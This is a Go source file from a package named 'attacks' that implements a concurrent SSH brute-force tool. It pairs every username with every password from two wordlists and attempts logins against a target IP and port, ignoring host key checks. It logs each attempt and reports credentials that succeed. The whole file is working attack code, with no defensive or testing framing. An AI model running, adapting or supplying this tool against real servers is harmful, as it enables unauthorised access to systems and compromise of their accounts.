package attacks

import (
    "fmt"
    "net"
    "os"
    "bufio"
    "strconv"
    // "time"
    "sync"
    // "runtime"
    // "io/ioutil"
    // "strings"
    "log"
    "golang.org/x/crypto/ssh"
)

var wg sync.WaitGroup

func check(e error) {
    if e != nil {
        panic(e)
    }
}

func ssh_test(username, password, serverIP, serverPort string) {

    config := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    }

    //Recover function
    defer func(){
        r := recover()
        if r!=nil{
            fmt.Println(r)
        }
    }()

    t := net.JoinHostPort(serverIP, serverPort)

    _, err := ssh.Dial("tcp", t, config)
    if err != nil {
        log.Println("[x] Failed to connect to", t, username, password)
        // fmt.Println(err)
        // panic("[X]ExitThread...")
    }else{
        log.Println("[+][+] Session Connect at ", t, "with user:", username, "password: ", password)//, sshConn)
    }
}

func work (job readerChan, serverIP, serverPort string){
    defer wg.Done()
    log.Println("[Attemp]", job.user, job.pass, job.pos)
    // time.Sleep(3 * time.Second)//proccess
    ssh_test(job.user, job.pass, serverIP, serverPort)
    // log.Println("[x]", job.user, job.pass, job.pos)
}

func read_files(user_file, pass_file string, rchan chan readerChan){

    f1, err := os.Open(user_file)
    check(err)
    f2, err := os.Open(pass_file)
    check(err)

    defer func(){
        f1.Close()
        f2.Close()
        close(rchan)
    }()

    ureader := bufio.NewScanner(f1)
    preader := bufio.NewScanner(f2)

    var userList [] string
    for i:=0;preader.Scan(); i++{
        if i==0{
            for j:=0;ureader.Scan(); j++{
                userList = append(userList, ureader.Text())
                // fmt.Println("[+]",j,i,userList[len(userList)-1],preader.Text())
                rchan <- readerChan{user: userList[len(userList)-1], pass: preader.Text(), pos: strconv.Itoa(i)+"-"+strconv.Itoa(j)}
            }
          
            if err := ureader.Err(); err != nil {
                check(err)
            }
        } else {
            // for j,u := range userList{
            for j,u := range userList{
                // fmt.Println("[+]",j,i,u,preader.Text())
                rchan <- readerChan {user: u, pass: preader.Text(), pos: strconv.Itoa(i)+"-"+strconv.Itoa(j)}
            }
        }
    }
    if err := preader.Err(); err != nil {
        check(err)
    }

}

type readerChan struct{
    user string
    pass string
    pos string
}

func ssh_bruteforce_start(userFile, passFile string, serverIP, serverPort string){
    // runtime.GOMAXPROCS(4)
    goMax := 9
    log.Println("[0] Starting jobs")

    rchan := make(chan readerChan, goMax)
    go read_files(userFile, passFile, rchan)
    var sem = make(chan int, goMax)
    for i:= 0; i< goMax; i++{
        sem <- 1
    }
    for {
        select {
        case job,ok := <- rchan:
            if !ok {
                wg.Wait()
                fmt.Println("[info] Jobs Finished")
                return
            }
            wg.Add(1)
            <-sem
            go func(job readerChan){
                work(job, serverIP, serverPort)
                sem <- 1
            }(job)
        }
    }

}